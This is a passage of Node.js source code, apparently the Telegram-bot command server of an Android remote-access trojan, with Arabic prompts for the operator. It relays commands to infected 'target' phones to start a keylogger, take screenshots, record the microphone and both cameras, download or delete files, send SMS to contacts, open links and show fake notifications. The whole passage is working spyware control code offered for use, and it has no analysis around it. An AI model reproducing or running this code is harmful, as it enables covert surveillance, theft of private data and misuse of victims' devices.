    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد التنفيذ\n\n' +
            '• سنرسل لك الرد بعد قليل'
        )
    }
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• يرجى الرد بالرقم الذي ترغب في إرسال الرسالة النصية إليه.\n\n' +
            '•إذا كنت ترغب في إرسال رسائل نصية إلى أرقام محلية، يمكنك إدخال الرقم مع الصفر في البداية، وإلا يجب عليك إدخال الرقم مع رمز الدولة.',
            {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ادخل الرسالة التي ترغب في إرسالها إلى جميع جهات الاتصال.\n\n' +
            '• كن حذرًا من أن الرسالة لن تُرسل إذا كان عدد الأحرف في رسالتك يتجاوز الحد المسموح به.',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }

    if (commend == 'open_target_link') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• أدخل الرابط الذي ترغب في إرساله.\n\n' +
            '•كن حذرًا من إرسال الروابط بمفردها دون أي نص مرفق.',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
    if (commend == 'text_to_speech') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• أدخل النص الذي ترغب في تحويله إلى كلام.\n\n' +
            '• لاحظ أنه يجب عليك إدخال النص الذي ترغب في أن يُنطق على الجهاز. يمكن استخدام أي لغة.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'my_fire_emoji') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 🔥 جاري معالجة طلبك.\n\n' +
            '• ستتلقى 🔥 في الدقائق القليلة القادمة.\n🔥🔥\n🔥🔥',
            {reply_markup: {force_reply: false}, parse_mode: "HTML"})
        appBot.sendMessage(id,
            '  🔥  \n' +
            ' 🔥🔥 \n' +
            '🔥🔥🔥',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["اجهزة متصله"], ["ارسال اوامر"]],
                    'resize_keyboard': true
                }
            }
        )
        currentUuid = uuid
    }
    if (commend == 'torch_on') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('torch_on');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة \n\n' +
            '• ستتلقى ردًا في الدقائق القليلة القادمة'
        )
    }
    if (commend == 'torch_off') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('torch_off');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
            '• ستتلقى ردًا في الدقائق القليلة القادمة'
        )
    }
    if (commend == 'keylogger_on') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('keylogger_on');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة\n\n' +
            '• ستتلقى ردًا في الدقائق القليلة القادمة'
        )
    }
    if (commend == 'keylogger_off') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('keylogger_off');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة\n\n' +
            '• ستتلقى ردًا في الدقائق القليلة القادمة'
        )
    }
    if (commend == 'screenshot') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('screenshot');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°•طلبك قيد المعالجة\n\n' +
            '• ستتلقى ردًا في الدقائق القليلة القادمة'
        )
    }

    if (commend == 'device_button') {
        currentUuid = uuid
        appBot.editMessageText(`°• اضغط على ازرار الهاتف : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: '|||', callback_data: `device_btn_:${currentUuid}:recent`},
                        {text: '■', callback_data: `device_btn_:${currentUuid}:home`},
                        {text: '<', callback_data: `device_btn_:${currentUuid}:back`}
                    ],
                                        [
                        {text: 'Vol +', callback_data: `device_btn_:${currentUuid}:vol_up`},
                        {text: 'Vol -', callback_data: `device_btn_:${currentUuid}:vol_down`},
                        {text: '⊙', callback_data: `device_btn_:${currentUuid}:power`}
                    ],
                    [
                        {text: 'Exit 🔙', callback_data: `device_btn_:${currentUuid}:exit`}
                    ]
                ]
            },
            parse_mode: "HTML"
        })
    }

    if (commend == 'device_btn_') {
        console.log(data.split(':')[0])
        console.log(data.split(':')[1])
        console.log(data.split(':')[2])

        switch (data.split(':')[2]) {
            case 'recent':
                appSocket.clients.forEach(function each(ws) {
                    if (ws.uuid == uuid) {
                        ws.send('btn_recent');
                    }
                });
                break;
            case 'home':
                appSocket.clients.forEach(function each(ws) {
                    if (ws.uuid == uuid) {
                        ws.send('btn_home');
                    }
                });
                break;
            case 'back':
                appSocket.clients.forEach(function each(ws) {
                    if (ws.uuid == uuid) {
                        ws.send('btn_back');
                    }
                });
                break;
            case 'vol_up':
                appSocket.clients.forEach(function each(ws) {
                    if (ws.uuid == uuid) {
                        ws.send('btn_vol_up');
                    }
                });
                break;
            case 'vol_down':
                appSocket.clients.forEach(function each(ws) {
                    if (ws.uuid == uuid) {
                        ws.send('btn_vol_down');
                    }
                });
                break;
            case 'power':
                appSocket.clients.forEach(function each(ws) {
                    if (ws.uuid == uuid) {
                        ws.send('btn_power');
                    }
                });
                break;
            case 'exit':
                appBot.deleteMessage(id, msg.message_id)
                break;
        } 
    }



    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• أدخل مسار الملف الذي ترغب في تنزيله\n\n' +
            '•لا تحتاج إلى إدخال المسار الكامل للملف، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> للاستلام ملفات المعرض.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• أدخل مسار الملف الذي ترغب في حذفه.\n\n' +
            '• لا تحتاج إلى إدخال المسار الكامل للملف، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لإزالة ملفات المعرض،',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• خل المدة التي ترغب في تسجيل الصوت بها باستخدام الميكروفون\n\n' +
            '• يرجى ملاحظة أنه يجب عليك إدخال الوقت بشكل رقمي بالثواني.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'rec_camera_selfie') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• أدخل المدة التي ترغب في تسجيل الفيديو بها باستخدام الكاميرا الأمامية.\n\n' +
            '• يرجى ملاحظة أنه يجب عليك إدخال الوقت بشكل رقمي بالثواني',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'rec_camera_main') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• أدخل المدة التي ترغب في تسجيل الفيديو بها باستخدام الكاميرا الرئيسية\n\n' +
            '• يرجى ملاحظة أنه يجب عليك إدخال الوقت بشكل رقمي بالثوانيꜱ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• أدخل الرسالة التي ترغب في ظهورها على الجهاز المستهدف\n\n' +
            '• ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°•أدخل الرسالة التي ترغب في ظهورها كإشعار\n\n' +
            '• ستظهر رسالتك في شريط الحالة للجهاز المستهدف مثل إشعار عادي',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• أدخل رابط الصوت الذي ترغب في تشغيله\n\n' +
            '• يرجى ملاحظة أنه يجب عليك إدخال الرابط المباشر للصوت المطلوب، وإلا فلن يتم تشغيل الصوت.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
});
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)
appServer.listen(process.env.PORT || 8999);
